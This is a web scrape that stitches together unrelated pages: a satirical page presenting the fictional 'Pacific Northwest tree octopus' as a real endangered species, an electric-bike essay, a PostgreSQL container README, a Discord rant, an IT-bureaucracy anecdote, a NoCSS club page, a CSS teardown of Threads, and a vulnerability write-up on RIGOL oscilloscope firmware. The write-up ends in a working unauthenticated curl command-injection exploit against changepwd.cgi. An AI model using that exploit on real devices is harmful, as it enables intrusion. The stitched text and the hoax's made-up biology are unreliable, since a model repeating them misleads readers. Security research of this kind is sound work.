</p>

<p>The Pacific Northwest tree octopus (<em>Octopus paxarbolis</em>) can be found in the <a href="http://en.wikipedia.org/wiki/Temperate_rainforest">temperate rainforests</a> of the Olympic Peninsula on the west coast of North America. Their habitat lies on the Eastern side of the Olympic mountain range, adjacent to Hood Canal. These solitary cephalopods reach an average size (measured from arm-tip to mantle-tip,) of 30-33 cm. Unlike most other cephalopods, tree octopuses are amphibious, spending only their early life and the period of their mating season in their ancestral aquatic environment. Because of the moistness of the rainforests and specialized skin adaptations, they are able to keep from becoming desiccated for prolonged periods of time, but given the chance they would prefer resting in pooled water.</p>

<p>An intelligent and inquisitive being (it has the largest brain-to-body ratio for any mollusk), the tree octopus explores its arboreal world by both touch and sight. Adaptations its ancestors originally evolved in the three dimensional environment of the sea have been put to good use in the spatially complex maze of the <a href="http://en.wikipedia.org/wiki/Olympic_National_Park">coniferous Olympic rainforests</a>. The challenges and richness of this environment (and the intimate way in which it interacts with it,) may account for the tree octopus's advanced behavioral development. (Some evolutionary theorists suppose that "arboreal adaptation" is what laid the groundwork in primates for the evolution of the human mind.)</p>

<p>Reaching out with one of her eight arms, each covered in sensitive suckers, a tree octopus might grab a branch to pull herself along in a form of locomotion called tentaculation; or she might be preparing to strike at an insect or small vertebrate, such as a frog or rodent, or steal an egg from a bird's nest; or she might even be examining some object that caught her fancy, instinctively desiring to manipulate it with her dexterous limbs (really deserving the title "sensory organs" more than mere "limbs",) in order to better know it.</p>

</p>

<p>Tree octopuses have eyesight comparable to humans. Besides allowing them to see their prey and environment, it helps them in inter-octopus relations. Although they are not social animals like us, they display to one-another their emotions through their ability to change the color of their skin: red indicates anger, white fear, while they normally maintain a mottled brown tone to blend in with the background.</p>

<p>The reproductive cycle of the tree octopus is still linked to its roots in the waters of the Puget Sound from where it is thought to have originated. Every year, in Spring, tree octopuses leave their homes in the <a href="http://www.fs.fed.us/r6/olympic/">Olympic National Forest</a> and migrate towards the shore and, eventually, their spawning grounds in Hood Canal. There, they congregate (the only real social time in their lives,) and find mates. After the male has deposited his sperm, he returns to the forests, leaving the female to find an aquatic lair in which to attach her strands of egg-clusters. The female will guard and care for her eggs until they hatch, refusing even to eat, and usually dying from her selflessness. The young will spend the first month or so floating through Hood Canal, Admiralty Inlet, and as far as North Puget Sound before eventually moving out of the water and beginning their adult lives.</p>

<p>Although the tree octopus is not officially listed on the Endangered Species List, we feel that it should be added since its numbers are at a critically low level for its breeding needs. The reasons for this dire situation include: decimation of habitat by logging and suburban encroachment; building of roads that cut off access to the water which it needs for spawning; predation by foreign species such as house cats; and booming populations of its natural predators, including the bald eagle and <a href="https://zapatopi.net/bsa/octopus.html">sasquatch</a>. What few that make it to the Canal are further hampered in their reproduction by the growing problem of pollution from farming and residential run-off. Unless immediate action is taken to protect this species and its habitat, the Pacific Northwest tree octopus will be but a memory.</p>

<p>The possibility of Pacific Northwest tree octopus extinction is not an unwarranted fear. Other tree octopus species—including the Douglas octopus and the red-ringed madrona sucker—were once abundant throughout the Cascadia region, but have since gone extinct because of threats similar to those faced by <em>paxarbolis</em>, as well as overharvesting by the now-illegal tree octopus trade.</p>

<p><img src="https://zapatopi.net/treeoctopus/cascadia_evening_post-1923-11.jpg" width="280" height="383" alt="Cascadia Evening Post" title="Cover of 1923 'Cascadia Evening Post' featuring woman wearing Tree Octopus hat"><br>

<p>The history of the tree octopus trade is a sad one. Their voracious appetite for bird plumes having exhausted all the worthy species of that family, the fashionistas moved on to cephalopodic accoutrements during the early 20th Century. Tree octopuses became prized by the fashion industry as ornamental decorations for hats, leading greedy trappers to wipe out whole populations to feed the vanity of the fashionable rich. While fortunately this practice has been outlawed, its effects still reverberate today as these millinery deprivations brought tree octopus numbers below the critical point where even minor environmental change could cause disaster.</p>

<p>While efforts were made in the past to preserve remaining tree octopus habitat, these were met with resistance by the timber industry, which has traditionally viewed the tree octopus <a href="https://zapatopi.net/blog/?post=200812287770.an_octopus_in_a_saw-mill">as a nuisance</a>, both because the octopuses favor the valuable, moss-shrouded trees of old growth forests—pitting conservation needs against lucrative sources of lumber—and because octopuses hiding among felled trees often gummed up sawmills and stained pulp vats with their ink.</p>

<p><a href="https://zapatopi.net/treeoctopus/bones_hartzell-tree_octopus_exhibit.jpg"><img src="https://zapatopi.net/treeoctopus/bones_hartzell-tree_octopus_exhibit-thumb280.jpg" width="280" height="376" alt="1942 Tree Octopus sideshow exhibit" title="'OCTOPUS: DEVIL OF THE TREES; TERROR OF ALL LOGGERS AND FOREST RANGERS'"></a><br>
Traveling sideshow exhibits, such as this one by Glen "Bones" Hartzell from 1942, demonized tree octopuses to the ignorant masses<br>(Click to enlarge)
</p>

<p>These nuisances led many loggers to regard tree octopuses as bad luck, resulting in the pointless killing of octopuses on sight at logging camps in a misguided attempt at eradicating the troublesome species. Anti-octopus sentiment was so strong among loggers that some even began to fear that the octopuses were prone to attacking humans.</p>

<p>These fears were fueled in no small part by gratuitous stories involving tree octopuses harassing lumberjacks and distressing damsels in Northwestern-themed pulp magazines of the 1930-40s and variously "nipping", "entangling", or "suckering the flesh" of the heroes of men's action magazines of the 1950-60s. (The magazine publishers depended on cheap paper made from wood pulp and were glad to contribute to the anti-octopus propaganda campaign of the timber industry.)</p>

<p>To this day, misunderstanding and fear of these gentle creatures can still be found among many old timers, although education campaigns—and special octopus-separators installed at sawmills—have largely halted the practice of tree octopus eradication.</p>

            <p>My electric bike sings, emits a nearly imperceptible hum from its tiny motor. I love its song. A song of peace and magic. Has money ever bought as much delight as the delight of an electric bike?</p>
<p>The first time I rode one was nearly a decade ago, in Kyoto. The electric bike I rented was huge and unwieldy, but that tug of its motor never left my mind. I went to climb a hill and it felt as if a giant had gently placed his hand on my back and pushed me forward. That stupid smile has been on my face ever since.</p>
<p>Two years ago I rented another one. This one smaller, lighter, the motor more powerful. I was convinced. This is the way. Eighteen months ago, in the heart of the pandemic, I committed and bought my first electric bike and have never looked back.</p>
<hr>
<p>Indulge me — a summer afternoon: Soaring down the coast, the ocean to one side and a strand of old pines to the other. The afternoon sun beats down but it feels cool and there’s something irrationally stirring — downright emotional — about the efficiency of this dumb machine beneath my body. The motor looks too small — just a black cylinder on the hub of the wheel. And yet it <em>moves</em>. It <em>sings</em> that song. A subtle hum. A beautiful hum. It makes me want to ride and ride, ridiculous distances, nonsensical distances. I don’t want to get to where I’m going because I want the ride to last longer. I want to linger in this space as long as possible, this space of smooth and efficient movement through the world, gliding in near total mechanical silence, just the sound of rubber on the pavement, wind in my ears, breaking waves, salt, the smell of pine. This is what electric bikes do: They drive you insane with the poetry of the world.</p>

<h4 id="so-many-bikes"><a href="#so-many-bikes">#</a>So Many Bikes </h4><p>All my standing life, I’ve biked. As a kid I rode a K-Mart Huffy to a rusted nub and then managed to nab a Haro Group 1. As an adult, bikes have been one of my few material indulgences (unwittingly, organically). In the past twenty years alone I’ve owned some fifteen bikes. I’ve had aluminum and carbon Bianchi road bikes. I’ve had steel Kalavinka keirin bikes with gorgeous head badges. I’ve had folding Dahon and Birdy BD-1s. I’ve had a handful of beloved brandless throwaway <em>mamachari</em>s — shopping bikes — that have proven hearty and fun in their own ways, and have each died uniquely. I’ve gone out of my way to get a handmade Arrow cruiser from a builder in Ogikubo. I still have a custom orange Moulton that I’ve modified into a single-speed city bomber that goes remarkably fast while floating atop its simple suspension.</p>
<p>And on and on — <em>bikes</em>. Why? Because as any bike lover will tell you, to be ensorcelled by the bike is to crave one and only one thing: More bike. Each new bike is like riding  once again for the first time. Exploring a city on a mamachari is different than a BD-1 is different than a Moulton. All thrilling. The bikes change, and so, too does your relationship to the pavement. My love for bikes has no categorical allegiances; if it has two wheels, and pedals, I’m interested. I want to ride them all.</p>

<p>Summers in most of Japan have never been easy. The temperatures England flirted with in 2022 are temperatures Tokyoites have contended with for centuries (and now contend with ones even higher). Crushing heat coupled with suffocating humidity. A three-shower-a-day kinda summer. Watch an Ozu film and observe the languid and supine impulse of its inhabitants during summertime scenes&nbsp;— that’s not affect, it’s survival. In Japan’s August, you simply can’t walk a block without losing most of your moisture.</p>
<p>Bikes have always helped. A bicycle generates a microclimate with minimal effort. Standing on a street corner you may be soaked, but on a bike, the wind whooshing past, you are crisp(er) and dry(er). An electric bike only amplifies the effect.</p>
<p>When I was a child I dreamt of having a personal helicopter. Powered by my feet and a bit of magic (certainly not gasoline, oddly, thinking back on it now). I imagined quietly gliding over the city in this tiny contraption, floating from home to video rental shop to diner, stopping by a friend’s house along the way. An electric bike gets me most of the way to this feeling.</p>
<p>In the past eighteen months I’ve put several thousand kilometers on my electric bikes. It feels like cheating in every best possible way. I live in a seaside town south of Tokyo and traffic can get ridiculous, its ancient roads sized for horses, not cars. The electric bike swoops between and alongside these stale processions of heat and burning fuel. Drifting behind a gas-powered scooter or moped feels like observing some Victorian contraption — inefficient and loud and clunky and burdensome and pollutant. And not much faster (often much slower) or more useful than an electric bike.</p>

<img src="https://craigmod.com/essays/images/electric_bikes/besv1.jpg" alt="A Vanmoof and a BESV">
<figcaption>My friend's S3 and my BESV (the X3 looks like a slightly smaller version of the S3)</figcaption>
</figure>
<h4 id="electrics"><a href="#electrics">#</a>Electrics </h4><p>I own two electric bikes. My first purchase was the strangely named BESV PSA1 — which is a smaller wheeled (20"), rear-wheel drive machine, with mostly off-the-shelf components allowing you to customize it to your liking. <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> And then, because I was so enamored by the BESV — so seduced by its small motor of <em>umph</em>, so wanting <em>more</em> and different electric bike experiences — I went and picked up a front-wheel drive Vanmoof X3 — the smaller-wheeled brother (24") to Vanmoof’s (quite frankly) giant S3 — just a few months later.</p>
<p>I love them both like damaged brothers, because both of these bikes are flawed in frustrating ways.</p>
<p>The electronic brain on the BESV is as dumb as they come.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> The settings reset each time you turn the bike on. The acceleration curves feel unrefined — herky-jerky, you might say. Its app is the worst app I have on my phone — badly designed, nearly functionally useless, clearly engineered without love. <em>And yet.</em> Despite these flaws I put hundreds of kilometers on this thing in the first month. The front and rear suspension turn every road to glass, and are even fine for dirt trails; I find myself hunting down paths through parks I’d never otherwise think about. Suddenly every hilly road is a thing demanding to be explored. <em>Up up up</em> the little machine yells, and you follow its command.</p>
<p>Guests who stay at my studio are given the BESV to ride. We take it down the coast. It never fails to amaze. One friend felt compelled to pet it upon dismount, saying, <em>Good job, buddy</em>, so quick and deep was the affection for the thing.</p>
<p>The Vanmoof is much smarter — the brain and software within it are refined, the app good, the acceleration curves smooth — but the bike is all custom components, and they aren’t the highest quality at that. The automatic shifting mechanism on mine failed twice in the first two months, requiring shipping the bike to the Vanmoof store.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> The seat post bolt broke off <em>in the post</em>. The original plastic pedals felt cheap and flimsy (pedals are one of the few things you can swap for your own). The aluminum frame is too stiff for the speed the bike generates — it can feel like you’ve been rattled to death after a bumpy road. (And stiffness mitigation by lowering tire pressure seems to only increase possibility of puncture.) But, more than all that, the design of the bike has a dangerous fundamental flaw: The bottom bracket is simply too low.</p>
<p>Of all my many, many bikes, I’ve never had a pedal bottom out. On this Vanmoof X3? Dozens of times. Most critically during a turn at speed — the pedal hit the pavement, jumped the bike sideways, and sent me flying. It’s the only bad crash I’ve had in decades. So I’ve had to modify the way I ride — no pedaling into or out of turns, hyper awareness of deviations in lateral road slope — because, <em>despite all this, I can’t stop riding this stupid thing</em>. It sings — that hum. It is joy. I reach for it daily and it takes me around the peninsula and makes me happy to be alive.</p>
<hr>

<figcaption>I've written about three electric bike rides for <em>Papersky Magazine</em>: Misaki, Oiso, and Yokosuka.</figcaption>
</figure>
<p>Allow me to share a dirty secret: More often than not, at midnight I can’t repress the impulse — I have to take a bike out. Out the bike comes and together we head into the empty streets of my town and hum our way all over, visiting temples in total silence. There are no cars. Often no people. It feels illicit — this slipping around town, this sliding into temple parking lots in the shroud of the night, looking at their old beams, feeling ten years old and grateful for both the ability and awareness to be doing just this very thing at this very moment.</p>
<hr>
<p>I’ve long since posited world peace could be achieved if you bought everyone in the world a bike, but now I want those bikes to be electric. I want everyone to feel this silliness, this punch-drunk stupidity of pure love, this sense of cheating the rules, the norms, this sense of ever-present delight. At our worst, humans mindlessly consume, sear the earth and each other, fill our bodies with poisons. At our best we invent electric bikes. Batteries have gotten more efficient, motors smaller and more powerful. The last decade has brought great efficiency to these machines, and the next ten years will only double down on these gains. Electric bike numbers are up, year over year over year. Tremendously so. Those who know, proselytize. We can’t help it. The charm is too great. The game non- zero sum. The more people who know, the better the world. It’s a wild notion, this sense of goodness to be had if you just reach out for it. Goodness with no real downside. Like solar panels or wind turbines, electric bikes are machines that buoy the spirit and the earth.</p>
<hr>
<p>Buy the best electric bike you can within your budget. Stretch if possible. Usually, the more you spend the lighter the machine, the more powerful the motor, the longer-lasting the battery. Depending on which country you live in top speeds will differ. In Japan the bike’s are capped at 24km/h. In America, 32km/h. Some places only allow for pedal-assist — meaning the motor only works when pedaling. Others allow throttles, blurring the line between bike and scooter. Laws will change in the coming years as more people adopt the machines and cities themselves adapt. This is just the start. Ten years ago it was fairly rare to see an electric bike around Tokyo. Today, it seems as if every parent hauling their kids is doing so electrically.</p>
<p>A good strategy: Find a local bike shop that will let you try out several electric bikes. Some have front-hub motors, others rear-hub motors. Others, the motor sits in the center, between the cranks. Each has a subtly different feel. Going up a hill, a front-motor’d machine may skip or slip as you pull back on the handlebars, but on flat land will feel more like being tugged through the world.</p>
<p>Sure, electric bikes aren’t cheap. But I believe they’re a rare object to be well worth the cost. This in spite of their annoying flaws, their often bad software, their defective geometries. Because they open the world. Whatever world may have been nearby, an electric bike brings it nearer. This is worth more than you might estimate. These bikes sing their little songs and the smile on your face makes you look like a village idiot, but what a wonderful idiot to be.</p>
<!--It’s been eighteen months and I keep expecting the novelty or smile to wear off, but they don’t. I find myself sneaking out at midnight to bike the empty streets of town in near total silence, visiting temples, swooping alongside the ocean. Atop an electric bike the world shrinks, you stay cool in the summer, you save the earth, and rarely do you ever want the ride to end. -->
<hr>
<p>A summer night: Biking home alongside a river. The air is thick with humidity and cicadas vibrate wildly in the distance. The moon is out. My choices: straight home along the shimmering moonlit river, or take a detour, up into the dark mountains, doubling the distance. To my surprise, I choose the mountains almost every time. <em>More!</em> That tiny child who fantasized about helicopters yells. <em>More of this, whatever this is. More more more.</em> And so I feed that impulse, an impulse generated and nurtured by the electric bike. Into the shadow mountains we go, up, pushed by the hand of that giant, always present, always ready to help. It is a ridiculous thing. A thing of peace and magic. An owl hoots. The smile has never left my face.</p>

            <article itemprop="text"><p dir="auto">This is a PostgreSQL Docker container for the Redash project.</p>
<p dir="auto">It's whole purpose in life is to automatically detect the
version of PostgreSQL used in the existing PostgreSQL data
directory, and automatically upgrade it (if needed) to the
latest version of PostgreSQL.</p>
<p dir="auto">After this, the PostgreSQL server starts and runs as per
normal.</p>
<p dir="auto">The reason this Docker container is needed, is because
the official Docker PostgreSQL container has no ability
to handle version upgrades, which leaves people to figure
it out manually (not great): <a data-error-text="Failed to load title" data-id="49823152" data-permission-text="Title is private" data-url="https://github.com/docker-library/postgres/issues/37" data-hovercard-type="issue" data-hovercard-url="/docker-library/postgres/issues/37/hovercard" href="https://github.com/docker-library/postgres/issues/37">docker-library/postgres#37</a></p>
<h2 tabindex="-1" dir="auto">Building the container</h2>
<p dir="auto">To build the docker image, use:</p>

<p dir="auto">This will take a few minutes to create the "pgautoupgrade:latest"
docker container, that you can use in your docker-compose.yml
files.</p>
<h2 tabindex="-1" dir="auto">Testing the container image</h2>
<p dir="auto">To run the tests, use:</p>

<p dir="auto">The test script creates an initial PostgreSQL database for
Redash using an older PG version, then starts Redash using
the above "automatic updating" PostgreSQL container to
update the database to the latest PostgreSQL version.</p>
<p dir="auto">It then checks that the database files were indeed updated
to the newest PostgreSQL release, and outputs an obvious
SUCCESS/FAILURE message for that loop.</p>
<p dir="auto">The test runs in a loop, testing (in sequence) PostgreSQL
versions 9.5, 9.6, 10.x, 11.x, 12.x, 13.x, and 14.x.</p>

<p>I'm going to be slightly contrarian and say that I <em>like</em> Discord. It's great to be able to get real-time help on a problem. And it is fun to see, again in real-time, what other people are working on and struggling with.</p><p>In truth, Discord is no harder to sign up to than Slack, Matrix, Gitter, IRC, or whatever. And of course Open Source projects will follow the maxim of "go where your audience are". There's no point posting everything to MySpace when everyone's already on Facebook.</p><p>Do I care that Discord isn't open source? Well, kinda. But I can open it in Firefox and it works just fine.</p><p>Discord is perfect for <em>ephemeral</em> communications.</p><p>But it is not a fucking substitute for documentation!</p><p>I'm currently getting started, and increasingly frustrated, with the <a href="https://watchy.sqfmi.com/">Watchy</a> development platform. They've effectively said "here's a barebones guide to setting it up - anything else, ask on Discord" - and it fucking sucks.</p><p>There's no API documentation - I have to scroll through a million messages to find anything.</p><p>I can't use search, because people don't know how to thread. So I can see questions but not replies.</p><p>When I do find replies, it's hard to know how relevant they are.  A typical Discord chat looks like:</p><ul><li>Alice: What's the command to go fullscreen?</li><li>Bob: Anyone know how I irrevocably format my disk without confirmation?</li><li>Carol: Oh, yeah, it's easy. Just pass the <code>-f</code> flag.</li></ul><p>Errrr...</p><p>And then you get the people who get snippy with newbie for asking a question which is frequently seen!  So infuriating.</p><p>I'm not necessarily advocating for <a href="https://documentation.divio.com/">the Four-Document Model</a> - which has <a href="https://www.hillelwayne.com/post/problems-with-the-4doc-model/">some critics</a> - but I just don't understand why wouldn't at least collate all of the common questions and put the answers in one place.</p><p>Look, writing a FAQ is probably not the right way to approach comprehensive documentation. But if you can't even be bothered to do that, perhaps you shouldn't be releasing a product in the first place?</p><p>/rant</p></div></article></div>]]></description>

<div id="readability-page-1" class="page"><div id="post_body_931711">
<p>(A true story.)</p>
<p>Philip (President): Our factory is underutilized by 10%. Either we start building more of our backlog or we lay people off. I'd rather keep everyone busy, build inventory, and get ahead of the curve before the busy season. How can we do that?</p>
<p>Lee (Operations Manager): Company policy restricts us from building more than 3 months of backlog. If you just change that to 4 months, we'll have plenty of work.</p>
<p>Philip: Done. Now how do we implement that?</p>
<p>Lee: I'm not really sure. I think we'd have to change a setting in the legacy software.</p>
<p>David (IT Director): No problem. It's probably one line of code in our core routine. Fill out a ticket and submit it to IT Services.</p>
<p>Judy (IT Admin): I'm assigning this request Ticket# 129281. But it still needs the section on Business Impact completed and Director approval.</p>
<p>David: It's for Philip. It we don't do this right away, we'll have to have a layoff.</p>
<p>Judy: OK, then I'll fill out that section myself and put this on the fast track.</p>
<p>2 days later.</p>
<p>David: What's the status of 129281?</p>
<p>Judy: It's the first Enhancement in the Developer Queue, after 14 Bug Reports.</p>
<p>David: Forget the queue. Mark it urgent and send it to Ed immediately.</p>
<p>1 hour later.</p>
<p>Ed (programmer): On line 1252 of Module ORP572, I changed the hard-coded variable MonthsOfBacklog from "3" to "4". I unit tested this successfully and ran 2 batch test runs. The Operations work queue increased 10% as expected. This is good to go. I just submitted it to Code Review and moved in to Homer for User Acceptance Testing.</p>
<p>Shirley (Code Review): It is now against company policy to have any hard-coded variables. You will have to make this a record in the Parameters file. Also, there are 2 old Debug commands, an unassigned variable warning message, and a hard-coded Employee ID that will all have to be fixed before this module can be moved to production.</p>
<p>Ed: Fuck that shit.</p>
<p>Shirley: That may very well be true. But since you were assigned ORP572, you are responsible for fixing preexisting errors that violate new company policy. I cannot promote this as it is.</p>
<p>2 hours later.</p>
<p>Ed: OK, done. I just resubmitted it to Code Review.</p>
<p>Julie (IT Testing): Homer is not available for User Acceptance Testing because Fred is running a controlled test for month-end accounting close. Use Marge instead.</p>
<p>Ed: I don't have access to Marge.</p>
<p>Julie: Then contact Joe in IT Security. He'll get you permissions.</p>
<p>2 hours later.</p>
<p>Joe (IT Security): I cannot grant you access to Marge without David's signature. He's out of town. Can this wait until Monday?</p>
<p>Ed: I don't think so. Philip wants this right away. Get him to grant access.</p>
<p>Shirley: Your new Parameters record "MonthsOfDemand" needs a better name. The offshore programmers won't understand what this means. Also, it should have an audit trail of changes.</p>
<p>Ed: What policy is that?</p>
<p>Shirley: It's not exactly written down anywhere. The offshore team is 3 months late updating the wiki, but I assure you, all new Parameter records must satisfy new naming requirements and keep audit trails.</p>
<p>1 day later:</p>
<p>Ed: I renamed the Parameters record "MonthsOfDemand" to "SelectedMonthsOfBacklogDemand" and added Module PAR634 to maintain that record and its audit trail. I have submitted it to Code Review.</p>
<p>Tony (IT Testing): I see 129281 on Marge, but I have no Test Plan.</p>
<p>Ed: Just run it the old way and the new way and note the increase in the total on the WorkOrdersHours report.</p>
<p>Tony: That's your test plan? No. This affects everything in the factory. I have to have user selected Test Cases, Expected Results, documented Test Runs, and user sign-off.</p>
<p>2 days later:</p>
<p>Philip: David, tell Tony to move Ed's program to production immediately.</p>
<p>David: Yes sir.</p>
<p>Total elapsed time: 6 days.<br>Lines of mission critical code changed: 1.<br>Bytes of mission critical code changed: 1.<br>Excedrin eaten: 24<br>Pissed off hours spent on Hacker News: 14.</p>

<div id="readability-page-1" class="page"><section><p>I work in a company that uses custom electronic boards, so there are plenty of instruments floating around that electrical engineers employ to debug faulty connections and solderings.</p>
<p>One kind of tools used are the oscilloscopes, tools that measure signals and plot them in a graphically understandable way. We have a bunch of them, yet only one model in particular caught my attention, because it has a web interface!</p>
<p><img src="https://tortel.li/rigol_web_control.png" alt=""></p>
<p>I was super curious so I decided to try and (digitally) crack it open. I headed to the <a href="https://www.rigolna.com/firmware/">vendor firmware downloads page</a>, selected the MSO5000 firmware and waited for my browser to complete the download.</p>
<p>The downloaded file ends in .GEL, and I have never seen that extension before. <code>file</code> thinks it’s a tar archive, so let’s try to use <code>binwalk -e</code> and extract what’s inside.</p>

<p>After extracting the <code>app.img.gz</code> with <code>p7zip</code>, I used <code>binwalk -e</code> again (it actually asked to install <a href="https://github.com/jrspruitt/ubi_reader">this tool</a> before allowing me to extract the files) and this was the resulting folder.</p>

<h2 id="lets-try-to-emulate-it">Let’s try to emulate it!</h2>
<p>We will use <code>qemu</code> and <code>chroot</code> in combination in order to emulate the oscilloscope software without having to brick a real oscilloscope.</p>
<p>But before tinkering with <code>qemu</code>, we need to have an exact copy of the internal memory of the oscilloscope, in order to have all the correct libraries installed.</p>
<p>Extract the <code>system.img</code> file we found before with <code>binwalk -e</code>. It will contain a file named <code>rootfs.img</code>, which is an ext2 image.</p>
<p>Mount and copy the rootfs image with <code>mkdir mount &amp;&amp; sudo mount rootfs.img mount/ &amp;&amp; cp -r mount rootfs &amp;&amp; sudo umount mount</code>. This should be the result.</p>

<p>We did it! Since we now have a functioning RIGOL web control application, let’s start to look for bugs.</p>
<p>While I could have started anywhere, I was intrigued by the <code>cgi-bin</code> folder. I fired up my Ghidra instance and I loaded every <code>cgi-bin</code> entry into it.</p>
<p>After a bit of unsuccessful fiddling and checking for buffer uses (I was aiming for a memory corruption vulnerability), I found some strange stuff on <code>changepwd.cgi</code>.</p>
<p>Let’s load it on Ghidra.</p>
<h2 id="the-vulnerability">The vulnerability</h2>
<p>This binary gets executed every time the user wants to change their password.</p>
<p>First of all we need to find the <code>main</code> function. Luckily, symbols are left intact in this, so we don’t have to guess too much. The main function is a little bit strange: turns out that this binary uses <a href="https://github.com/boutell/cgic">this library</a> to handle CGI programming in C.</p>
<p>As the project’s <code>README</code> <a href="https://github.com/boutell/cgic#how-to-write-a-cgic-application">says</a>, the developer’s custom code starts in the function <code>cgiMain()</code>. Let’s find it.</p>
<p><img src="https://tortel.li/changepwd-bin.png" alt="The disassembly"></p>
<p>The call to <code>system</code> looks super suspicious. The author basically wanted a quick way to write <code>admin:user_password</code> inside the <code>path</code> file (<code>/rigol/data/user.conf</code>). It does this by launching a shell and executing <code>echo admin:user_password &gt; /rigol/data/user.conf</code>.</p>
<div><pre tabindex="0"><code data-lang="c"><span><span>n <span>=</span> strlen(pass0);
</span></span><span><span>iVar2 <span>=</span> strncmp(saved_pwd,pass0,n);
</span></span><span><span><span>if</span> (iVar2 <span>==</span> <span>0</span>) {
</span></span><span><span>    sprintf(<span>&amp;</span>CMD_BUF,<span>"echo admin:%s &gt; %s"</span>,pass1,path);
</span></span><span><span>    system(<span>&amp;</span>CMD_BUF);
</span></span><span><span>    system(<span>"sync"</span>);
</span></span><span><span>    puts(<span>"OK"</span>);
</span></span><span><span>}
</span></span><span><span><span>else</span> {
</span></span><span><span>    puts(<span>"Old password is wrong"</span>);
</span></span><span><span>}
</span></span></code></pre></div><p>If an attacker passing something like <code>; whoami # </code> as <code>pass1</code>, they could execute arbitrary commands on the underlying system.</p>
<p>But, in order to reach that command injection vulnerability we need to pass the <code>strncmp</code> check that checks <code>pass0</code> against the saved password.</p>
<p>As per the manual, the <code>int strncmp(const char s1, const char s2, size_t n)</code> function compares the first <code>n</code> characters of the two strings. It is a little less known that if <code>n</code> is 0, the result of the <code>strncmp</code> function is also 0.</p>
<p>Can we force <code>n</code> to be 0?</p>
<p>Yes, if we manage to control <code>pass0</code>. If we passed an empty <code>pass0</code>, the <code>strlen</code> function would return 0 and that 0 would get passed as the <code>n</code> parameter to the <code>strncmp</code> function, letting us bypass the check!</p>
<p>So, we need to check whether we actually control <code>pass0</code> and <code>pass1</code>. If we scroll up a little bit we find these two assignments.</p>
<div><pre tabindex="0"><code data-lang="c"><span><span>pcVar1 <span>=</span> (<span>char</span> <span>*</span>)read_item_value(<span>"pass0"</span>,<span>256</span>);
</span></span><span><span>strcpy(pass0,pcVar1);
</span></span><span><span>pcVar1 <span>=</span> (<span>char</span> <span>*</span>)read_item_value(<span>"pass1"</span>,<span>256</span>);
</span></span><span><span>strcpy(pass1,pcVar1);
</span></span></code></pre></div><p><code>read_item_value</code> is basically a wrapper around <a href="https://github.com/boutell/cgic#cgiFormString"><code>cgiFormString</code></a>. If we provide the <code>pass0</code> and <code>pass1</code> form values in our HTTP request, we’re set.</p>
<div><pre tabindex="0"><code data-lang="c"><span><span><span>char</span><span>*</span> <span>read_item_value</span>(<span>char</span><span>*</span> param,<span>int</span> size) {
</span></span><span><span>  <span>// cmd_str is a global allocated buffer.
</span></span></span><span><span><span></span>  memset(cmd_str,<span>0</span>,<span>0x100</span>);
</span></span><span><span>  cgiFormString(param,cmd_str,size);
</span></span><span><span>  <span>return</span> cmd_str;
</span></span><span><span>}
</span></span></code></pre></div><h2 id="the-exploit">The exploit</h2>
<p>So, in the end, we control everything! A simple <code>curl</code> command is enough to hack an RIGOL oscilloscope through the RIGOL Web Control, without being authenticated at all.</p>
<div><pre tabindex="0"><code data-lang="bash"><span><span>curl http://localhost/cgi-bin/changepwd.cgi -d <span>"pass0="</span> -d <span>"pass1=; whoami; id; uname -a # "</span>

The modern web is <strong>literally Satan and will probably eat your first-born
child if we don't do anything about it, and quick!</strong> (had to increase the
hyperbolism from <a href="https://1mb.club/">the</a>
<a href="https://512kb.club/">other</a>
<a href="https://250kb.club/">websites</a>; interestingly,
<a href="https://no-js.club/">the NoJS Club</a>, which until now has arguably
been the most radical of *.clubs, does not have much hyperbole, which really is
a shame).
</p>

<p>
To do what the Web was initally intended for (that is, make information
accessible via the Internet), all you need is to serve HTML documents. If you
need <em>"style"</em> that just means you're trying to cover up your lack of
interesting information.
</p>

<p>
Have *.club websites gone too far? Yes. If the author's own personal website
doesn't qualify for the list, that's a good sign of having gone too far. That
being said, please submit websites, your own or just interesting ones you like,
if they qualify for the rules below.
</p>

<h2>The Rules:</h2>

<ol>
    <li> No CSS (linked or in a <code>style</code> tag). </li>
    <li> No <code>style</code> attributes. </li>
    <li> No JavaScript. </li>
</ol>

<h2>Submitting:</h2>

<p>
<a href="mailto:m@m-chrzan.xyz">Email me</a> with "[NoCSS] <em>submitted

<div id="readability-page-1" class="page"><div>
		
		<p>When I encounter a new product, one of the first things that comes to mind is how they implemented the CSS. This was no different when I came across Threads by Meta. I quickly explored the mobile app and noticed that I could preview public posts on the web.</p>

<p>This presented an opportunity for me to dig deeper. I came across a few interesting findings, which I will discuss in this article.</p>

<p>Let’s dive in!</p>

<h2 id="using-css-grid-for-the-post-layout">Using CSS grid for the post layout</h2>

<p>One of the most noteworthy use cases of CSS Grid in a production app is found in Threads. CSS Grid is used to build the post layout.</p>

<p>Take a look:</p>

<figure>
    
        <img src="https://ishadeed.com/assets/threads-app-css/threads-post-grid-layout.png" alt="">
    
    
        <figcaption></figcaption>
    
</figure>

<div><pre><code><span>:root</span> <span>{</span>
  <span>--barcelona-threadline-column-width</span><span>:</span> <span>48px</span><span>;</span>
<span>}</span>

<span>.post</span> <span>{</span>
  <span>display</span><span>:</span> <span>grid</span><span>;</span>
  <span>grid-template-columns</span><span>:</span>
    <span>var</span><span>(</span><span>--barcelona-threadline-column-width</span><span>)</span>
    <span>minmax</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>fr</span><span>);</span>
  <span>grid-template-rows</span><span>:</span> <span>21px</span> <span>19px</span> <span>max-content</span> <span>max-content</span><span>;</span>
<span>}</span>
</code></pre></div>

<p><strong>Fun fact:</strong> the first grid column is named <code>--barcelona</code>. I’m curious to know the reason behind this choice.</p>

<p>The post layout consists of a 2-column * 4-row grid. There is no main container; each item within the post is manually placed using the <code>grid-column</code> and <code>grid-row</code> properties.</p>

<h3 id="the-user-avatar">The user avatar</h3>

<div><pre><code><span>.post-avatar</span> <span>{</span>
  <span>padding-top</span><span>:</span> <span>4px</span><span>;</span>
  <span>grid-row</span><span>:</span> <span>1</span> <span>/</span> <span>span</span> <span>2</span><span>;</span>
  <span>grid-column</span><span>:</span> <span>1</span><span>;</span>
<span>}</span>
</code></pre></div>

<p>The avatar is positioned in the first column and spans the first two rows. It’s worth noting the presence of <code>padding-top</code>. Although I couldn’t find a specific reason for it in the production code, it seems to be fine-tuning the UI alignment.</p>

